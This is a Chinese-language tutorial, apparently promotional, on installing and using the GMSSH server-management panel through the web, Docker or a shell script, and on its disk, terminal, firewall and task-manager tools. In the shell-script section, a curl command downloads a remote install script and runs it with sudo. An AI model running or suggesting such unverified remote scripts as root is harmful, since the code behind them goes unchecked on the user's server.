<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fff1a4d3d9474e8a9b2ff92bf03db719~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=vMlEGFNLjSK01IPyk4UTOaKq%2BjI%3D" alt="image.png" loading="lazy"/></p>
<p>在上图中展示的是GMSSH的主控界面，可以看到其采用了类似桌面操作系统的UI布局，左侧为应用分类与快捷入口，中间区域则用于展示服务器的实时运行状态及各功能模块的交互窗口。这种设计极大地降低了运维人员的学习成本。</p>
<h2 data-id="heading-1">零基础多机协同：GMSSH本地端的高效管理与自动化命令中心</h2>
<p>在管理多台服务器或为个人博客进行跨环境部署时，单一的连接模式往往难以满足复杂的运维需求。GMSSH本地端通过设备集群管理与标准化命令库，进一步降低了操作门槛，实现了从单机运维到多主机协同的跨越。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22ad35b28cc2476db0f17bf3d7312e4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=DGSAbZanH4IeWewY5bORB5Q0qio%3D" alt="image.png" loading="lazy"/></p>
<p>上图展示了GMSSH本地端的设备列表视图。该功能支持添加并同时管理多台设备，无论是位于不同云服务商的远程主机，还是本地局域网内的测试服务器，都可以统一集成在左侧的设备树中。这种聚合式的管理逻辑，使得管理人员可以在不同服务器之间快速切换，极大地提升了多机协同工作的效率。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06fac0b4ad2f4f27a1927bb1899cb20c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=NS0UwdGuyrGCI%2FkmyRJa4QZy9eU%3D" alt="image.png" loading="lazy"/></p>
<p>针对每一台接入的设备，系统都提供了高度灵活的配置入口。上图反映了设备信息的编辑界面，在这里可以对主机的登录标签、IP地址、认证密钥以及连接协议进行精准定义。这种可视化的表单交互排除了手动编辑SSH配置文件可能出现的格式错误，确保了每一条连接的安全与稳定。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c609989c1c944246bfe4588d52377fde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=XeD88DBi9l2Ck2zs5XQ%2BdyVT9Vc%3D" alt="image.png" loading="lazy"/></p>
<p>为了真正实现零基础运维，GMSSH内置了强大的命令中心。上图清晰地展示了命令中心内涵盖的各类开发者工具集。该模块不仅包含了系统监控与基础维护指令，还深度集成了针对Docker容器的生命周期管理以及Git代码版本控制的相关操作。运维人员无需在终端逐字输入复杂的长命令，通过预设的脚本库即可一键执行高频任务。这种将经验代码化、图形化的设计，为个人博客的快速迭代与服务器的日常巡检提供了可靠的技术支撑。</p>
<h2 data-id="heading-2">一、 深度解析GMSSH的多维部署策略</h2>
<p>GMSSH提供了极其灵活的部署方案，以适应不同的网络环境与安全需求。无论是临时性的运维需求，还是长期稳定的生产环境管理，都能找到对应的接入点。</p>
<h3 data-id="heading-3">1. 网页端直接接入</h3>
<p>对于开发者在异地或临时设备上需要紧急处理服务器事务的场景，网页端接入是最快捷的方式。用户无需在本地安装任何客户端，通过访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fweb.gmssh.com%2Fnewweb%2F%23%2F" target="_blank" title="https://web.gmssh.com/newweb/#/" ref="nofollow noopener noreferrer">web.gmssh.com/newweb/#/</a> 即可实现即开即用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af23b990ff7b4a37abaa6c829a978715~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=XXK%2FzZ6U12ASfJ8hEKQLbod9bH8%3D" alt="image.png" loading="lazy"/></p>
<p>上图展示了网页端登录界面，界面简洁明了。用户只需在对应的输入框中填入目标服务器的IP地址以及相应的SSH登录密码。网页端通过加密协议与服务器建立连接，确保了数据传输过程中的安全性。</p>
<h3 data-id="heading-4">2. 基于Docker容器的标准化部署</h3>
<p>Docker容器化部署是目前企业级应用的主流选择。通过Docker部署GMSSH，可以确保管理环境的隔离性与一致性，同时便于后续的迁移与升级。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8126aaff00e42cc9c887ef1908def26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=gNOVhcfvChs1hwto8dWyM56EMRM%3D" alt="image.png" loading="lazy"/></p>
<p>在上图所示的命令行环境中，展示了通过Docker拉取镜像并运行容器的过程。具体的执行逻辑包含创建本地数据挂载目录、拉取官方镜像、启动临时容器提取配置文件、以及最终挂载配置文件并启动持久化服务。</p>
<p>以下是具体的复合执行命令：</p>
<pre><code class="hljs language-Bash" lang="Bash">DATA_DIR=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/gmssh_data"</span> &amp;&amp; <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$DATA_DIR</span>/config"</span> <span class="hljs-string">"<span class="hljs-variable">$DATA_DIR</span>/logs"</span> &amp;&amp; docker pull docker-rep.gmssh.com/gmssh/gs-main-x86:latest &amp;&amp; docker run -d --name gm-service-latest -p 8090:80 --restart always docker-rep.gmssh.com/gmssh/gs-main-x86:latest &amp;&amp; docker <span class="hljs-built_in">cp</span> gm-service-latest:/app/config/config.json <span class="hljs-string">"<span class="hljs-variable">$DATA_DIR</span>/config"</span> &amp;&amp; docker stop gm-service-latest &amp;&amp; docker <span class="hljs-built_in">rm</span> gm-service-latest &amp;&amp; docker run -d --name gm-service -p 8090:80 --restart always -v <span class="hljs-string">"<span class="hljs-variable">$DATA_DIR</span>/logs:/gs_logs"</span> -v <span class="hljs-string">"<span class="hljs-variable">$DATA_DIR</span>/config:/app/config"</span> docker-rep.gmssh.com/gmssh/gs-main-x86:latest
</code></pre>
<p>该命令首先定义了本地存储路径，确保配置与日志在容器销毁后依然存在。通过 <code>-v</code> 参数实现了宿主机目录与容器内部目录的绑定。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5c5e47ae3643e8ba624d03e92acb32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=eixCJLTXPXC10OQQdl788gZAA%2BU%3D" alt="image.png" loading="lazy"/></p>
<p>在上图中，系统已经开始执行镜像的下载任务，展示了各层（Layers）的下载进度。镜像来源于官方私有仓库，确保了软件源的可靠性。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a11ac40bd02430e8cf99fc7ef2620d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=pCHW2ILC%2BHaDG6pLqoYLlymWU%2Fc%3D" alt="image.png" loading="lazy"/></p>
<p>通过 <code>docker ps -a</code> 命令可以确认容器的状态。如上图所示，名为 <code>gm-service</code> 的容器正在运行，且其内部的80端口已成功映射到宿主机的8090端口。这意味着用户可以通过浏览器访问服务器IP加8090端口来打开管理后台。</p>
<p>如果出现页面无法加载的情况，通常是因为防火墙未开放对应端口。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f0c57fa25f2443b9b116fc0f818f173~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=D99czAVHMChSXzZh8OldHYHYZMk%3D" alt="image.png" loading="lazy"/></p>
<p>在上图中，通过服务器厂商的安全组控制台手动添加了一条入站规则，协议为TCP，端口范围设置为8090，策略为允许。这一步是确保外部网络流量能够触达容器服务的关键。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67ba8e7ef4814a05bee3b850790728fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=e8TmewHaUWe7Brya1t54cZ%2FsOgA%3D" alt="image.png" loading="lazy"/></p>
<p>完成端口开放后，在浏览器中输入对应的访问地址，即可看到GMSSH的引导界面。上图展示了成功加载后的登录页，说明Docker部署流程圆满完成。</p>
<h3 data-id="heading-5">3. Shell脚本自动化安装</h3>
<p>对于追求极简操作的用户，官方提供了Shell一键安装脚本。这种方式会自动处理依赖关系并完成服务的注册。</p>
<pre><code class="hljs language-Bash" lang="Bash">curl -fsSL https://gmb-prod-gw.oss-accelerate.aliyuncs.com/up/14/gm/20260101/1101136955e3798da1al1UKg2_sh.file -o gm.sh  &amp;&amp; <span class="hljs-built_in">chmod</span> +x gm.sh &amp;&amp; sudo ./gm.sh install
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fb7de908e9d441089502c4f658df087~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=JXLH049tvOSwLld4O1CMeAo016w%3D" alt="image.png" loading="lazy"/></p>
<p>在上图的安装过程中，系统提示80端口已被Nginx服务占用。这是脚本安装模式下的常见冲突，GMSSH表现出了良好的交互性，提示用户可以自定义安装端口。</p>
<pre><code class="hljs language-Bash" lang="Bash">bash ./gm.sh setport 90
</code></pre>
<p>通过上述命令将端口修改为90。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21488f47188c49b6b7f9bd0fafadd399~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=5jU%2FkFwQWNQG9YQfIsktPscLXZA%3D" alt="image.png" loading="lazy"/></p>
<p>上图显示了端口修改成功后的反馈，系统自动重启了相关服务。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02d919afa9d74e9a977f3bc64564bd77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=F%2BClxUihQ%2FRSZQhkHvrRoKA4Bwo%3D" alt="image.png" loading="lazy"/></p>
<p>通过执行 <code>bash ./gm.sh status</code> 命令，可以实时查看服务的运行状态。上图中的绿色运行标志表明各组件均处于正常工作状态。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25f7af2bf94c4fefbdc542e4b2668fa0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=fOXl%2FxUoM5yID9LtLFEKEWhHaFw%3D" alt="image.png" loading="lazy"/></p>
<p>在浏览器访问90端口，GMSSH的交互主界面如期而至。上图清晰地展示了主界面的布局，其美观度远超传统的SSH客户端。</p>
<p>对于更深入的定制需求，官方文档提供了详尽的参数说明。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2598fb1a69d943428b0f95451bb33a88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=oD%2FibyQe1Gk0Bfxv99Ka5UMG2gg%3D" alt="image.png" loading="lazy"/></p>
<p>上图展示了官方私有化部署文档的入口，其中涵盖了各种环境下的进阶配置指南。</p>
<h2 data-id="heading-6">二、 磁盘管理：解决服务器空间焦虑</h2>
<p>Linux服务器在长期运行过程中，日志文件、缓存文件以及临时文件极易占满磁盘空间，导致系统响应缓慢甚至服务中断。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3c53c2f347c477da8773f20fefa2fdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=q89ay%2BnQEUUlpxfxll2606I6c%2Bc%3D" alt="image.png" loading="lazy"/></p>
<p>上图反映了一个典型的磁盘告警场景。可以看到根分区的占用率已接近90%，这种情况会导致诸如 <code>git pull</code> 等需要临时空间的写操作直接报错。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/590870c6a8a5485a99849ed52a906b7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=IrmsMeg7JrvbPkIIfGE0QOe9DtI%3D" alt="image.png" loading="lazy"/></p>
<p>GMSSH内置的可视化磁盘清理工具改变了这一现状。上图展示了清理工具的主界面，用户可以清晰地看到磁盘的挂载详情、总容量、已用空间及剩余百分比。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a63a87a1bf346b38b86dd204f7eb52f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=1BvP%2BlAN9ja4w5TG%2FaqAm%2FG4N8Y%3D" alt="image.png" loading="lazy"/></p>
<p>在该工具中，用户可以勾选特定的文件类型进行全盘扫描。上图展示了扫描结果，文件按大小进行降序排列，并标注了路径。运维人员可以针对性地点击删除，释放空间。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ed3a2948c5647a5a3462864477db950~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=ATLr%2BwzRL%2BqSqzfsTGNDd6M544w%3D" alt="image.png" loading="lazy"/></p>
<p>上图展示了磁盘挂载状态的深度视图。不仅可以看到逻辑分区的空间，还能洞察各分区的挂载点以及物理磁盘的分布情况。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51f3887bf6464095bbb413ce3d63a7aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=ZTgLflutp0azQ42mrEGBAGtH3JY%3D" alt="image.png" loading="lazy"/></p>
<p>为了防患于未然，GMSSH支持定时清理任务的设定。上图展示了定时任务的配置界面，用户可以指定清理某个目录（如日志存放目录），设置保留天数，由系统自动执行回收逻辑。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c87e88726bdf4efa8d9f6cc11ef0db78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=nUCO3YvU7BJF2cTbf9vRIqCBHPY%3D" alt="image.png" loading="lazy"/></p>
<p>许多运维人员习惯使用 <code>nohup</code> 运行任务，但这往往会产生巨大的 <code>nohup.out</code> 日志文件。上图展示了对这类典型大文件的可视化识别。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a85f6860649447d196c2db9e462e7f91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=WU3uYYD%2FDs2groaBCsQFP%2BLCIGQ%3D" alt="image.png" loading="lazy"/></p>
<p>上图体现了文件管理系统的深度集成。每一个文件的大小、修改时间、权限信息都以图标化的形式呈现，极大地提升了文件筛选效率。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/810c50fc374d4d85bb04bbe296aec899~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=QASfaKJj3C2gVD%2FFF%2FpPLSjrFlw%3D" alt="image.png" loading="lazy"/></p>
<p>当系统资源触及预警线时，界面会弹出红色的警示信息，如上图所示。这种主动式的监控提示能够让管理人员在故障发生前及时介入。</p>
<h2 data-id="heading-7">三、 终端革新：AI补全与可视化交互</h2>
<p>GMSSH的终端模块并非简单的字符映射，而是深度集成了现代IDE的特性。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/143ddf204883499ba8155c2490211d7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=ldnHULtMSE6iuqui%2BmG11hjWa%2BM%3D" alt="image.png" loading="lazy"/></p>
<p>上图展示了终端的AI补全功能。当输入命令前缀时，系统会自动列出可能的命令组合，并附带简要的功能描述。用户只需通过方向键或鼠标点击即可完成输入，有效避免了拼写错误。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65509a418fed4de8af65fdb316a87f94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=9ydh1JqSGFTo%2BstVbNuCLQbSg8g%3D" alt="image.png" loading="lazy"/></p>
<p>与传统终端不同，GMSSH在操作时会同步展示当前目录的文件列表，如上图所示。这种“左侧目录树，右侧命令行”的布局实现了视觉上的实时反馈。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be769bf3ca4641de96eef358599505d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=Lc%2BBR%2BdPTKeZak9X%2FEHqTrcbaXA%3D" alt="image.png" loading="lazy"/></p>
<p>上图展示了在线文本编辑功能。用户可以直接在界面上打开并编辑配置文件，支持语法高亮。这种模式彻底告别了复杂的Vim快捷键，实现了像编辑本地文档一样的体验。此外，系统还支持文件的可视化上传、下载及解压，不再依赖繁琐的SCP命令。</p>
<h2 data-id="heading-8">四、 安全底座：全能型防火墙管理器</h2>
<p>防火墙配置通常需要涉及复杂的iptables命令或频繁切换到云服务商后台。GMSSH将这一功能进行了本地化封装。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ee83efd39914831a002a544d3fc9301~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=XTWlLjSuULroj87Cf0GtagjJiZs%3D" alt="image.png" loading="lazy"/></p>
<p>上图展示了防火墙管理器的核心界面。在这里可以一键开启或关闭端口，管理规则列表，且所有变更都会实时作用于系统。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3dcd0642ee34ddca1a8b91283232f7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=Rt4oYI4ZU%2ByTrwipXMdIxDw05fk%3D" alt="image.png" loading="lazy"/></p>
<p>更为强大的是其转发管理功能。上图展示了入站转发与出站转发的配置弹窗。运维人员可以轻松实现内网穿透或流量导流，这在多机协作环境中具有极高的实用价值。</p>
<h2 data-id="heading-9">五、 全局视角：任务管理器与性能看板</h2>
<p>对服务器负载的实时把控是系统稳定性的保证。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d16e7f4afc8e4ef2802985dabc77ca05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=Q8qWZQ4Der%2BblQMtaYz5%2BV7WDC4%3D" alt="image.png" loading="lazy"/></p>
<p>上图展示了进程级别的任务管理器。可以清晰地看到每一个正在运行的进程ID、CPU占用、内存占用以及启动用户。点击右侧操作按钮，可以实现进程的强制停止。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/083ec17c57384ffbbd16e1b7478f7e70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=FRCwQoLDY1QYK7o6B0cajNiBANc%3D" alt="image.png" loading="lazy"/></p>
<p>上图是性能实时看板。通过动态曲线图展示了CPU使用率、内存负载、磁盘IO以及网络流量的实时波动。这种直观的数据展示有助于快速定位系统瓶颈。</p>
<h2 data-id="heading-10">六、 实战演练：基于GMSSH与Docker部署WordPress</h2>
<p>为了验证GMSSH在实际生产环境中的效能，以下演示如何快速搭建一个功能完备的WordPress个人博客。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f48181a429524ebb9da4626af53c4120~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=unQpWCi2Jp%2BfoP3lRceaOHsnUmc%3D" alt="image.png" loading="lazy"/></p>
<p>进入GMSSH的桌面模式，可以看到如上图所示的干净工作环境。所有操作都将通过点击与拖拽完成。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2b8359ef1824033a32ddd7923defb7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=8hM4bgsAgHj2wC1VO5korZ0XoQU%3D" alt="image.png" loading="lazy"/></p>
<p>在实用工具栏中找到并点击Docker管理器。上图展示了Docker管理器的入口位置。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69293fe363ea445fb7388dc31f7242b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=6KXJ2hrp%2BTcY0KQL9JuYabauauA%3D" alt="image.png" loading="lazy"/></p>
<p>如果宿主机尚未安装Docker环境，GMSSH提供了一键安装功能。上图展示了触发安装后的确认界面。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcb50efe57a44b8bbd25ac0686a8402f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=8lb80EkE3yWmd%2BXIL2jzWfmG918%3D" alt="image.png" loading="lazy"/></p>
<p>安装过程中，系统会弹出一个实时日志窗口。如上图所示，后台正在执行软件包更新及Docker引擎的安装逻辑，所有的技术细节都对用户透明化。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a666d1299d4b48d38b06c0e2554fb303~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=CBG%2BjYhxJHFqYnvmyb1VwvDfZ0Y%3D" alt="image.png" loading="lazy"/></p>
<p>安装完成后，在设置选项中可以看到系统已预设了多个高质量的国内镜像源。上图展示了镜像源管理界面，这对于在国内环境下加速拉取镜像至关重要。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3afcff57c7e842bd9a556b95e69ec242~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=hvA%2FUJ00pre2Yc0tBRec%2BPu5dME%3D" alt="image.png" loading="lazy"/></p>
<p>接着进行Docker Compose及Build组件的安装。上图显示了组件安装的过程，这些工具是后续运行多容器应用的基础。</p>
<p>接下来是数据库的部署，WordPress需要MySQL作为数据后端。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/676b01c7e93245d2a0906e7767b496bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=pbYaRdpHDZXOuMjshDlJc1rT2JQ%3D" alt="image.png" loading="lazy"/></p>
<p>在上图中，用户在应用商店中选择了MySQL镜像。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de4f6be6e129483fb7be0b93c26e5e43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=cSlX6XKckDCrUPqb76pjH%2BvxDdY%3D" alt="image.png" loading="lazy"/></p>
<p>系统弹出了参数编辑框，如上图所示。在这里需要设定数据库的端口、Root密码以及持久化卷的路径。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/355c033021744728a3dc949c2dd1b5dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=bMrikO78KI66IcCQP%2Bub0L4IILk%3D" alt="image.png" loading="lazy"/></p>
<p>上图确认了MySQL容器已成功启动。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3cec74aadbdf49eb9db49760ceaa4aed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5peg54ix5aaC5L2V6YeK5oCA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283680&amp;x-signature=TYEkJc%2BXoawKlBur5qwS0AzJav0%3D" alt="image.png" loading="lazy"/></p>
<p>在镜像管理页中，可以看到新生成的镜像ID及状态。上图反映了系统已正确下载并标记了对应的数据库镜像。</p>
